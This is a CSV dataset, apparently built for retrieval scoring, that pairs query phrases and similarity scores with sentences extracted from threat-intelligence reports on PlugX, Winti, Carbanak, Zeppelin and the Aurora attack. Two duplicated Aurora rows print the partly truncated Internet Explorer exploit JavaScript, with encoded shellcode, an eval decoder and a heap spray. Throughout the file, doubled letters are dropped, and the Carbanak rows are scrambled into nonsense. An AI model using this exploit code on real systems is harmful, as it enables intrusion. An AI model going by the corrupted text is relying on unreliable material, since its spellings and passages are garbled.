19c90678c8b66114c16c983c980d62f3,encrypted with AES-256-CBC;,0.9288888278347719,"['Basicaly, its a payload loader.', 'The whole code is obfuscated with diferent Windows API cals and lops.', 'It wasnt designed to confuse a reverse enginer or to make reverse enginering harder, but to bypas some simple AV emulation engines.', 'The first exported function for every COM object is DlGetClasObject.', 'DlGetClasObject The loader creates a thread that decrypts the payload, restores its PE and MZ headers, and then loads it into memory and launches it.', 'The payload is encrypted with AES 256 CBC.', 'The decryption key is hardcoded along with other encrypted strings.', 'It doesnt contain MZ and PE tags that alow it to bypas simple AV engines.', 'After initializing the payload, the loader cals its function with ordinal 1. nav_downarow.png The payload, with backdor functionality, is a DL file.', 'The malware functionality is in the first exported entry only.', 'nav_downarow.png Ordinal 1 (Trojan-backdor main function) The first thing that it does is decrypt the other encrypted binary (containing configuration data) from the SFX content: The configuration itself is divided into blocks, and every block has its own index.']"
8b1ec3103590201632c0768238d50bea,is encrypted in the standard way,0.7612294597050578,"['Standard encryption in FunySwitch 21/41 2.', 'HTP with long poling There are thre types of requests: GET ""conect"", GET ""pul"", and POST ""push"".', 'To start transfering data, the client must conect by sending a GET request to a URL from the configuration and provide a special cokie value.', 'The cokie name is eight random characters.', 'The value is an encrypted Base64 string containing the sesion GUID and operation name (""conect"").', 'The string is encrypted in the standard way with the key ""htp"".', 'The client then constantly sends GET requests with pul operations.', 'In response, the server returns the relevant aray of mesages for the client or, if no new mesages have arived in the last 10 seconds, an empty response.', 'Clientserver mesages are periodicaly sent as an aray as wel, for which a POST request with push operation is used.', 'Figure 42.', 'FunySwitch conect and pul requests The special clas MsgPack clas, which implements a custom serialization protocol, unpacks the aray and other primitive types.']"
f76af7c2f5a93ac5f088df8efafaf1f7,SeDebugPrivilege,0.7764692682324938,"['put the company in contact with Zepelin victims so that they could help decrypt their files.', 'The atackers Use aplication alow listing where aplicable.', 'said they were motivated to crack Zepelin after the Locking down PowerShel can increase security, for ransomware gang started atacking nonprofit and example with the constrained language mode.', 'charity organizations.', 'Despite this ocurence, Zepelin Make credential dumping more dificult, for example activity continued in 2023, though not at the same levels by enabling Credential Guard in Windows 10 or as sen in previous years.', 'disabling SeDebugPrivilege.', 'MFA can help limit the usefulnes of compromised Conclusion credentials.', 'Ransomware wil continue to be a major threat for Create a plan to consider notification of outside organizations in 2024 and beyond.', 'Incentivized by parties.', 'In order to ensure corect notification of big payouts, ransomware atackers have proven to required organizations, such as the FBI or other law be persistent and adaptive, capable of responding to enforcement authorities/agencies, be sure to have a disruption by reorganizing themselves and consistently verifiable plan in place.', 'developing new tactics.']"
8b1ec3103590201632c0768238d50bea,obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).,0.8057738097297371,"['Its core is typical of PlugX, being an SFX archive (cdb8e0162796efe19128c0bac78478fd1f2dc382aed0c19b0f4bd9a31efc) that contains the library mapistub.dl, which loads as a legitimate executable.', '29/41 Figure 5.', 'PlugX SFX archive But mapistub.dl is only a downloader.', 'Gogle Docs is used to store the payload: the library sends a request to export a certain document in .txt format, decodes it into shelcode with Base64, and runs it.', 'Figure 56.', 'Loading and runing shelcode in mapistub.dl The shelcode has ben obfuscated with junk instructions and inverted conditional jumps (combinations of jle/jg and the like).', 'Its job is to decrypt and run the next stage, which is responsible for reflective loading of the main PlugX component and pasing the structure with the configuration to it.', 'Figure 57.', 'Obfuscated shelcode from Gogle Docs This proces and what the similar sample does after that are described in more detail in a report from Dr.Web (QuickHeal shelcode and BackDor.PlugX.28).', 'Besides the C2 servers in the configuration file, 103.79.76[.', ']205 and ns.mircosoftbox[.']"
e1b62284c43a215e027fd02ff57dd76f,the file is deleted,0.8156571553427849,"['The intrusion outlined in this report discuses a case that presented substantial chalenges due to: 1 Krebs; Krebs on Security Posts Taged: Carbanak; htps:/krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; htps:/w.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; htps:/krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyat Hotels Sufers 2nd Card Breach in 2 Years; htps:/krebsonsecurity.com/2017/10/hyat-hotels-sufers-2nd-card-breach-in-2-years/ 5 Miler, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personel Involved in SEC Filings; 2 htps:/w.fireye.com/blog/threat-research/2017/03/fin7_spear_phishing.html WHITE PAPER The initial intrusion vector Unique atacker tolset The atacker dwel time The large, heterogeneous environment The sped with which the atackers gained administrative aces The forensic mindfulnes of the CARBANAK atackers The tolset utilized by the atackers was a mix of custom tols, frely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK tolset using various publicly available The tolasentd u otpileizne ds obuyr cthe r eastoaucrkcers.', 'wSiaxs o af tmhiex tofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelre cfoduen da nd open Deleted: , source stof thwavre buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy alvl a3i2la obfl eth aen tmivailriuciso uasg gfirlegs ainti othne s iCteA.R OBfA NAK Deleted: tolset using various publicly available and open source resources.', 'Six of the tols used in this these six, five of them have litle to no detection or indication of malice from Deleted: Open intrusion were found to have ben uploaded to a publicly available antivirus agregation site.', 'Of these sixa,n ftiveir oufs tvhenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans onf mthalitc teh fer ocmlie antsiv irus vendors.']"
e1b62284c43a215e027fd02ff57dd76f,the file is deleted,0.8156571553427849,"['The intrusion outlined in this report discuses a case that presented substantial chalenges due to: 1 Krebs; Krebs on Security Posts Taged: Carbanak; htps:/krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; htps:/w.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; htps:/krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyat Hotels Sufers 2nd Card Breach in 2 Years; htps:/krebsonsecurity.com/2017/10/hyat-hotels-sufers-2nd-card-breach-in-2-years/ 5 Miler, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personel Involved in SEC Filings; 2 htps:/w.fireye.com/blog/threat-research/2017/03/fin7_spear_phishing.html WHITE PAPER The initial intrusion vector Unique atacker tolset The atacker dwel time The large, heterogeneous environment The sped with which the atackers gained administrative aces The forensic mindfulnes of the CARBANAK atackers The tolset utilized by the atackers was a mix of custom tols, frely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK tolset using various publicly available The tolasentd u otpileizne ds obuyr cthe r eastoaucrkcers.', 'wSiaxs o af tmhiex tofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelre cfoduen da nd open Deleted: , source stof thwavre buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy alvl a3i2la obfl eth aen tmivailriuciso uasg gfirlegs ainti othne s iCteA.R OBfA NAK Deleted: tolset using various publicly available and open source resources.', 'Six of the tols used in this these six, five of them have litle to no detection or indication of malice from Deleted: Open intrusion were found to have ben uploaded to a publicly available antivirus agregation site.', 'Of these sixa,n ftiveir oufs tvhenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans onf mthalitc teh fer ocmlie antsiv irus vendors.']"
f4750e89f876496d6211c0467eb22a24,the file is deleted,0.9314813120372311,"['The JavaScript performs a heap spray atack and injects the embeded shelcode described below.', 'The JavaScript exploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model (DOM) element.', 'Javascript Exploit Code <html> <head> <script> var sc = unescape(""%u9090%u19eb%u4b5b%u390%u90c9%u7b80%ue901%u0175%u6c3%u7b9%u804%u0b34%ue2d8%uebfa%ue805%ufe2%uf%u3931%ud8db%u87 d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8ca%u9e53 %u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE.', '8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3e1%u1c40%uc75%u8fac%ud5be%u9b27%u746%u403%uc8d2%u5820%u70e%u2342% ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ub%uabd%uf6ab%ub%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u0d8""); var s = Aray (826, 679, 798, 24, 70, 427, 819, 70, 707, 805, 693, 679, 784, 707, 280, 238, 259, 819, 36, 693, 36, 70, 259, 819, 36, 693, 36, 70, 238, 287, 413, 24, 83, SECTION REMOVED FOR SPACE.', '735, 427, 36, 413, 735, 420, 350, 36, 36, 413, 735, 301, 301, 287, 24, 861, 840, 637, 735, 651, 427, 70, 301, 805, 693, 413, 875); var ar = new Aray; for (var i = 0; i < s.length; i +) { ar[i] = String.fromCharCode (s [i] / 7); } var c = ar.toString (); c = c.replace (/,/g, ""); c = c.replace (/@/g, "",""); eval (c); var x1 = new Aray (); for (i = 0; i < 20; i +) { x1 [i] = document.createElement (""COMENT""); x1 [i].data = ""abc""; }; var e1 = nul; function ev1 (evt) { e1 = document.createEventObject (evt); document.getElementById (""sp1"").inerHTML = ""; window.setInterval (ev2, 50); } function ev2 () { p = ""\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u 0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0 d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d""; for (i = 0; i < x1.length; i +) { x1 [i].data = p; }; var t = e1.srcElement; } </script> </head> <body> <span id=""sp1""><IMG SRC=""a.gif"" onload=""ev1(event)"" width=""16"" height=""16""></span> </body> </html> JavaScript Artifacts Patern Initial encrypted droper download.', 'Deleted file.', 'C:\\%apdata%\\a.exe Decrypted droper.', 'Deleted file.', 'C:\\%apdata\\b.exe JavaScript present in Internet Explorer memory space.', '<code listed above> Download URL present in internet history during memory htp:/demo1.ftpaces.c/demo/ad.jpg analysis.', 'Other domains asociated with Aurora.']"
f4750e89f876496d6211c0467eb22a24,the file is deleted,0.9314813120372311,"['The JavaScript performs a heap spray atack and injects the embeded shelcode described below.', 'The JavaScript exploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model (DOM) element.', 'Javascript Exploit Code <html> <head> <script> var sc = unescape(""%u9090%u19eb%u4b5b%u390%u90c9%u7b80%ue901%u0175%u6c3%u7b9%u804%u0b34%ue2d8%uebfa%ue805%ufe2%uf%u3931%ud8db%u87 d8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8ca%u9e53 %u30d4%uda37%ud8d8%u3053%ud9b2%u308 SECTION REMOVED FOR SPACE.', '8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3e1%u1c40%uc75%u8fac%ud5be%u9b27%u746%u403%uc8d2%u5820%u70e%u2342% ucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ub%uabd%uf6ab%ub%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u0d8""); var s = Aray (826, 679, 798, 24, 70, 427, 819, 70, 707, 805, 693, 679, 784, 707, 280, 238, 259, 819, 36, 693, 36, 70, 259, 819, 36, 693, 36, 70, 238, 287, 413, 24, 83, SECTION REMOVED FOR SPACE.', '735, 427, 36, 413, 735, 420, 350, 36, 36, 413, 735, 301, 301, 287, 24, 861, 840, 637, 735, 651, 427, 70, 301, 805, 693, 413, 875); var ar = new Aray; for (var i = 0; i < s.length; i +) { ar[i] = String.fromCharCode (s [i] / 7); } var c = ar.toString (); c = c.replace (/,/g, ""); c = c.replace (/@/g, "",""); eval (c); var x1 = new Aray (); for (i = 0; i < 20; i +) { x1 [i] = document.createElement (""COMENT""); x1 [i].data = ""abc""; }; var e1 = nul; function ev1 (evt) { e1 = document.createEventObject (evt); document.getElementById (""sp1"").inerHTML = ""; window.setInterval (ev2, 50); } function ev2 () { p = ""\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u 0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0 d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d""; for (i = 0; i < x1.length; i +) { x1 [i].data = p; }; var t = e1.srcElement; } </script> </head> <body> <span id=""sp1""><IMG SRC=""a.gif"" onload=""ev1(event)"" width=""16"" height=""16""></span> </body> </html> JavaScript Artifacts Patern Initial encrypted droper download.', 'Deleted file.', 'C:\\%apdata%\\a.exe Decrypted droper.', 'Deleted file.', 'C:\\%apdata\\b.exe JavaScript present in Internet Explorer memory space.', '<code listed above> Download URL present in internet history during memory htp:/demo1.ftpaces.c/demo/ad.jpg analysis.', 'Other domains asociated with Aurora.']"
7607a101fda17219c8a6cbc34de42baa,cleanup script,0.7648695296458871,"['5 Infection proces .', '6 ok.exe the botkit instaler .', '6 01.dat.', '10 TestMsg64.tmp .', '1 c3.bat component instalation and clean-up .', '1 System cleanup .', '12 Firewal rules .', '16 Components update .', '16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .']"
7607a101fda17219c8a6cbc34de42baa,cleanup script,0.7648695296458871,"['5 Infection proces .', '6 ok.exe the botkit instaler .', '6 01.dat.', '10 TestMsg64.tmp .', '1 c3.bat component instalation and clean-up .', '1 System cleanup .', '12 Firewal rules .', '16 Components update .', '16 Persistence .', '16 System fingerprinting .', '19 Predecesor: c2.bat .']"
066f8e166df721ff8a1d6660d7430281,injects the payload in memory.,0.7743361832345079,"['htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 6/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs The model uses the persistence technique utilizing svchost.exe with service.dl to instal a rogue service.', 'It apears that the dl employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more dificult.', 'The DL embeds several obfuscated strings decoded when runing.', 'Once the fingerprinting has ben done, the malware wil instal the malicious service using the API RegisterServiceHandlerA then SetServiceStatus, and finaly CreateEventA.', 'A description of the technique can be found here.', 'The malware also decrypts and injects the payload in memory.', 'The folowing screnshot shows the routine decryption.', 'Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.', 'The malware described in the article is atributed to the Winti malware family.', 'The operating method and the code used in the DL described in the article are very similar to our analysis and observations.', 'The proces dump also revealed further indicators.']"
066f8e166df721ff8a1d6660d7430281,The malware was injected into a SVCHOST process where a driver location pointed to the config file,0.8910782533172276,"['A redacted snipet of the code would lok like this: htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 7/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs Creating archive *.rar Ading [data from location] 0% OK Another indicator of discovering Winti malware was the folowing execution path we discovered in the comand line dump of the memory: cmd /c klcsngtgui.exe 1560413F7E <abreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).', 'In this case, the payload file was named using an abreviation of the victim companys name.', 'Unfortunately, the adversary had removed the payload file from the system.', 'File carving did not work since the disk/unalocated space was overwriten.', 'However, reconstructing traces from memory revealed that we were dealing with the Winti 4.0 malware.', 'The malware was injected into a SVCHOST proces where a driver location pointed to the config file.', 'We observed in the proces dump the exfiltration of data on the system, such as OS, Procesor (architecture), Domain, Username, etc.', 'Another clue that helped us was the use of DNS tuneling by Winti which we discovered traces of in memory.', 'The hardcoded 208.67.2.2 resolves to a legitimate OpenDNS DNS server.', 'The IP is pushed into the list generated by the malware at runtime.', 'At the start of the malware, it populates the list with the systems DNS, and the OpenDNS server is only used as a backup to ensure that the C2 domain is resolved.']"
066f8e166df721ff8a1d6660d7430281,the adversary had removed the payload file from the system.,0.8810226255602196,"['Firstly, it revealed artifacts related to the DL analyzed, C:\\ProgramData\\Microsoft\\Windows\\SuperfRtch\\SuperfRtch.dat.', 'We believe that this dat file might be the loaded payload.', 'Secondly, while investigating the proces dump, we observed activities from the backdor that are part of the data exfiltration atempts which we wil describe in more detail in this analysis report.', 'A redacted snipet of the code would lok like this: htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 7/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs Creating archive *.rar Ading [data from location] 0% OK Another indicator of discovering Winti malware was the folowing execution path we discovered in the comand line dump of the memory: cmd /c klcsngtgui.exe 1560413F7E <abreviation-victim>.dat What we observed here was the use of a valid executable, the AES 256 decryption key of the payload (.dat file).', 'In this case, the payload file was named using an abreviation of the victim companys name.', 'Unfortunately, the adversary had removed the payload file from the system.', 'File carving did not work since the disk/unalocated space was overwriten.', 'However, reconstructing traces from memory revealed that we were dealing with the Winti 4.0 malware.', 'The malware was injected into a SVCHOST proces where a driver location pointed to the config file.', 'We observed in the proces dump the exfiltration of data on the system, such as OS, Procesor (architecture), Domain, Username, etc.', 'Another clue that helped us was the use of DNS tuneling by Winti which we discovered traces of in memory.']"
066f8e166df721ff8a1d6660d7430281,"When the executable is run, the DLL next to it is loaded.",0.809502461977936,"['The adversary used either the standalone version or distributed thre files on diferent asets in the network to gain remote control of those asets.', 'The samples discovered and analyzed were comunicating towards two domains.', 'Both domains were registered during the time of the campaign.', 'One of the PlugX samples consisted of the folowing thre parts: Filename Hashes HPCustPartic.exe SHA256: 85723207b4b0f0e4a2c3b5717fd65079209784f41694f8e1b469e34754cf6 HPCustPartUI.dl SHA256: 0e5b19ea38b52d8ba4c7f05fa1df95a4f9c2c93b05a87c5854653248560 HPCustPartic.bin SHA256: 08f7b98c2453507c45dacd4a7a7c1b372b5fafc945db214c62c8d21d2975 The .exe file is a valid and signed executable and, in this case, an executable from HP (HP Customer participation).', 'We also observed other valid executables being used, ranging from AV vendors to video software.', 'When the executable is run, the DL next to it is loaded.', 'The DL is valid but contains a smal hok towards the payload which, in our case, is the .bin file.', 'The DL loads the PlugX config and injects it into a proces.', 'We executed the samples in a test setup and dumped the memory of the machine to conduct memory analysis with volatility.', 'After the basic forensicaly sound steps, we ran the malfind plugin to detect posible injected code in a proces.', 'From the redacted output of the plugin, we observed the folowing values for the proces with posible injected code: htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 4/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs Proces: svchost.exe Pid: 860 Adres: 0xb50 Proces: explorer.exe Pid: 2752 Adres: 0x56a0 Proces: svchost.exe Pid: 176 Adres: 0x80 Proces: svchost.exe Pid: 176 Adres: 0x190 Proces: rundl32.exe Pid: 3784 Adres: 0xd0 Proces: rundl32.exe Pid: 3784 Adres: 0x20 One observation is the mention of the SVCHOST proces with a ProcesID value of 176 that is mentioned twice but with diferent adreses.']"
066f8e166df721ff8a1d6660d7430281,". The name of the created service, “SysmainUpdate”, is usurping the name of the legitimate service “SysMain” which is related to the legitimate DLL sysmain.dll and also to the Superfetch service.",0.8880549628214527,"['Investigating the dumps after dynamic analysis, we observed two domain names used for C2 trafic: brushupdata.com brushupdata.com htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 5/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs In particular, we saw the folowing hardcoded value that might be another payload being downloaded: sery.brushupdata.com/CE1BC21B4340FEC2B863B69 The PlugX families we observed used DNS [T1071.01] [T1071.04] as the transport chanel for C2 trafic, in particular TXT queries.', 'Investigating the trafic from our samples, we observed the check-in-signature (20 2A 2F 2A 0D) that is typical for PlugX network trafic: 0: 47 45 54 20 2F 42 34 42 42 4 43 43 30 32 39 45 010: 31 31 39 37 31 39 46 30 36 35 36 32 32 20 48 54 020: 54 50 2F 31 2E 31 0D 0A 41 63 63 65 70 74 3A 20 030: 2A 2F 2A 0D 0A 43 6F 6F 6B 69 65 3A 20 4 36 43 040: 57 50 2B 56 5A 47 6D 59 6B 6D 64 6D 64 64 58 5 050: 71 58 4D 31 71 31 6A 41 3D 0D 0A 5 73 65 72 2D During our analysis of the diferent PlugX samples discovered, the domain names as mentioned above stayed the same, though the payload values were diferent.', 'For example: hxp:/sery.brushupdata.com/B4BDC029E19719F06562 hxp:/sery.brushupdata.com/07FDB1B97D2E6AF2482B1B hxp:/sery.brushupdata.com/273CDC0B9C6218BC18756D Other PlugX samples we observed injected themselves into Windows Media Player and started a conection with the folowing two domains: asmlbigip.com asmlbigip.com Helo Winti Another mechanism observed was to start a program as a service [T1543.03] on the Operating System with the acquired System rights by using the *Potato tols.', 'The file the adversary was using semed to be a backdor that was using the DL file format (2458562ca2f6fabdae8385cb817c172).', 'The DL is used to create a malicious service and its name is service.dl.', 'The name of the created service, SysmainUpdate, is usurping the name of the legitimate service SysMain which is related to the legitimate DL sysmain.dl and also to the Superfetch service.', 'The dl is run using the comand rundl32.exe SuperFrtch.dl, #1.', 'The export function has the name WwanSvcMain.', 'htps:/w.mcafe.com/blogs/enterprise/mcafe-enterprise-atr/operation-harvest-a-dep-dive-into-a-long-term-campaign/ 6/19 9/15/21, 3:20 PM Operation Harvest: A Dep Dive into a Long-term Campaign | McAfe Blogs The model uses the persistence technique utilizing svchost.exe with service.dl to instal a rogue service.', 'It apears that the dl employs several mechanisms to fingerprint the targeted system and avoid analysis in the sandbox, making analysis more dificult.', 'The DL embeds several obfuscated strings decoded when runing.']"
01be204435044a83ae8553bc754a2b98,and lateral movement/execution of files,0.7832306772332936,"['2013 CVE-2013-063 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec) (Tick) 4, 1 LAC .5 2017 6 (SecureWorks) (Bronze Butler)6 , 7 7 1 8 .', '2018 6 42 USB .9 2014 .', '208 .', 'IT .', ', USB .', '.', '.', '1 htps:/w.symantec.com/conect/blogs/adobe-zero-day-used-ladyboyle-atack 2 htps:/w.fireye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 htps:/asec.ahnlab.com/912 4 htps:/w.symantec.com/conect/blogs/tick-cyberespionage-group-zeros-japan 5 htps:/w.lac.co.jp/english/report/2016/1/04_cgview_01.html 6 htps:/w.secureworks.com/research/bronze-butler-targets-japanese-busineses 7 htps:/unit42.paloaltonetworks.com/unit42-tick-group-continues-atacks/ 8 htps:/blog.trendmicro.com/trendlabs-security-inteligence/redbaldknight-bronze-butler-daserf-backdor-now-using- steganography/ 9 htps:/unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gaped-critical-systems/ AhnLab, Inc. Al rights reserved.', '3 Analysis Report_Tick Group 2014 .', ', , , , , , , IT .', ', MS , .']"
f6c926edfa0eb75e375214e6fe43fa2f,and lateral movement/execution of files,0.7832306772332936,"['Furthermore, the group showed mature capabilities for tuneling trafic and overjumping air gaps, respectively internet isolation of systems and networks.', 'The main lesons learned are: 1.', 'Entry point is very often the user.', 'The atackers use also diferent comunication media, like LinkedIn or WhatsAp and company mail.', 'Companies should train their users to detect and prevent spear phishing atacks and provide a clear and easy to use reporting proceses.', '2.', 'Although the technical level of the atackers is quite advanced, basic protective measures like automaticaly updated URL block lists in the proxy help with early detection and slowing down of such atacks.', '3.', 'If you recognize similar TPs or IOCs in your infrastructure, you should cary out very serious incident analysis, before trying to contain the incident.', 'Otherwise, evidence may be gone, and atackers stil might have aces to the network.', 'As in case of reinfection, the atackers reuse previously compromised asets.']"
e1baf1d01587423eb4aa184c8327f15f,and lateral movement/execution of files,0.7832306772332936,"['1 6.5 Privilege Escalation .', '17 6.6 Defense Evasion .', '17 THE CHANGING THREAT LANDSCAPE IN 2021 .', '2 6.7 Credential Aces .', '19 1 Just Another Incident Response investigation?', '.', '2 6.8 Discovery .', '19 2 The Major Vulnerabilities in 2021 .', '3 6.9 Lateral Movement .', '20 6.10 Colection .', '20 3 A Spotlight on the Role of APT Groups .']"
e1b62284c43a215e027fd02ff57dd76f,and lateral movement/execution of files,0.7832306772332936,"['The intrusion outlined in this report discuses a case that presented substantial chalenges due to: 1 Krebs; Krebs on Security Posts Taged: Carbanak; htps:/krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; htps:/w.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; htps:/krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyat Hotels Sufers 2nd Card Breach in 2 Years; htps:/krebsonsecurity.com/2017/10/hyat-hotels-sufers-2nd-card-breach-in-2-years/ 5 Miler, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personel Involved in SEC Filings; 2 htps:/w.fireye.com/blog/threat-research/2017/03/fin7_spear_phishing.html WHITE PAPER The initial intrusion vector Unique atacker tolset The atacker dwel time The large, heterogeneous environment The sped with which the atackers gained administrative aces The forensic mindfulnes of the CARBANAK atackers The tolset utilized by the atackers was a mix of custom tols, frely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK tolset using various publicly available The tolasentd u otpileizne ds obuyr cthe r eastoaucrkcers.', 'wSiaxs o af tmhiex tofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelre cfoduen da nd open Deleted: , source stof thwavre buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy alvl a3i2la obfl eth aen tmivailriuciso uasg gfirlegs ainti othne s iCteA.R OBfA NAK Deleted: tolset using various publicly available and open source resources.', 'Six of the tols used in this these six, five of them have litle to no detection or indication of malice from Deleted: Open intrusion were found to have ben uploaded to a publicly available antivirus agregation site.', 'Of these sixa,n ftiveir oufs tvhenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans onf mthalitc teh fer ocmlie antsiv irus vendors.']"
e1b62284c43a215e027fd02ff57dd76f,and lateral movement/execution of files,0.7832306772332936,"['The intrusion outlined in this report discuses a case that presented substantial chalenges due to: 1 Krebs; Krebs on Security Posts Taged: Carbanak; htps:/krebsonsecurity.com/tag/carbanak/ 2 Schwartz; Sophisticated Carbanak Banking Malware Returns, With Upgrades; htps:/w.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns- upgrades-a-8523 3 Krebs; Payments Giant Verifone Investigating Breach; htps:/krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/ 4 Krebs; Hyat Hotels Sufers 2nd Card Breach in 2 Years; htps:/krebsonsecurity.com/2017/10/hyat-hotels-sufers-2nd-card-breach-in-2-years/ 5 Miler, Nuce, Vengerik; FIN7 Spear Phishing Campaign Targets Personel Involved in SEC Filings; 2 htps:/w.fireye.com/blog/threat-research/2017/03/fin7_spear_phishing.html WHITE PAPER The initial intrusion vector Unique atacker tolset The atacker dwel time The large, heterogeneous environment The sped with which the atackers gained administrative aces The forensic mindfulnes of the CARBANAK atackers The tolset utilized by the atackers was a mix of custom tols, frely !', 'The!Shadows!of!Ghosts!', 'available code, and open source software utilities.', 'RSA I!R researcChaesde!', 'aSltlu 3dy2: !oCfA RBANAK!', '!', 'the malicious files in the CARBANAK tolset using various publicly available The tolasentd u otpileizne ds obuyr cthe r eastoaucrkcers.', 'wSiaxs o af tmhiex tofo clus sutsoemd tino otlhsi,s f irneterluy saiovani lwabelre cfoduen da nd open Deleted: , source stof thwavre buetielinti eusp.l oRaSdAe IdR t ore as epaurbchliecldy alvl a3i2la obfl eth aen tmivailriuciso uasg gfirlegs ainti othne s iCteA.R OBfA NAK Deleted: tolset using various publicly available and open source resources.', 'Six of the tols used in this these six, five of them have litle to no detection or indication of malice from Deleted: Open intrusion were found to have ben uploaded to a publicly available antivirus agregation site.', 'Of these sixa,n ftiveir oufs tvhenmd ohrasv.', 'eT hlitistl eo btose nrov adteiotenc etixopnl aoirn isn tdhicea rtieoans onf mthalitc teh fer ocmlie antsiv irus vendors.']"
